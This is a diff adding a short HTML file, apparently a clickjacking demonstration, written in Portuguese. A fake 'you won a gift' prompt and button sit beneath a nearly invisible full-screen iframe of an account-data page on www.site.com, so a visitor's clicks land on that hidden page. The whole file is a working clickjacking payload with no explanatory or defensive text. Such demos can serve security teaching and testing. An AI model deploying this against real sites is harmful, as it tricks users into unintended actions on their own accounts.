@@ -1,0 +1,15 @@
+<!-- clickjacking-animado.html -->
+<html>
+  <body style="margin:0;">
+    <div style="position: absolute; top: 50px; left: 50px; z-index: 2;">
+      <h2>Você ganhou um presente! Clique aqui 👇</h2>
+      <button style="font-size: 24px;">Receber Presente</button>
+    </div>
+
+    <!-- iframe real posicionado por cima -->
+    <iframe src="https://www.site.com/conta/meus-dados"
+            style="position: absolute; top: 0; left: 0; width: 100vw; height: 100vh; border: none;
+                   opacity: 0.01; z-index: 3;">
+    </iframe>
+  </body>
+</html>
